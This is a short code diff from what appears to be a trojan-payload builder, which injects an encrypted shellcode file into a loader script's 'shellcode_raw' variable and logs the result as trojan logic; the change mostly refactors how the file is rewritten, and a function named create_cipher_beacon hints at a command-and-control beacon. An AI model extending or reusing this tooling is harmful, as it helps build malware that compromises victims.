@@ -12,15 +12,12 @@ def main():
     with open(project_path.add_abs_path("/step2.py"), "r+", encoding="utf-8") as f1:
         with open(project_path.add_abs_path("/resource/shellcode_cipher.tmp"), "rb") as f2:
             step2 = f1.read()
-            # print(step2)
             shellcode_cipher = f2.read()
             new_string = re.sub(r"shellcode_raw = b\"(.*?)\"", 'shellcode_raw = b"' + shellcode_cipher.decode() + '"' , step2)
-            # print(shellcode_cipher.decode())
             logger.debug(f'木马逻辑: {new_string}')
-            # print(f1)
-            f1.seek(0, 0)
-            f1.write(new_string)
-            # logger.info("payload生成成功")
+
+    with open(project_path.add_abs_path("/step2.py"), 'w', encoding="utf-8") as f1:
+        f1.write(new_string)
 
 
 def create_cipher_beacon():
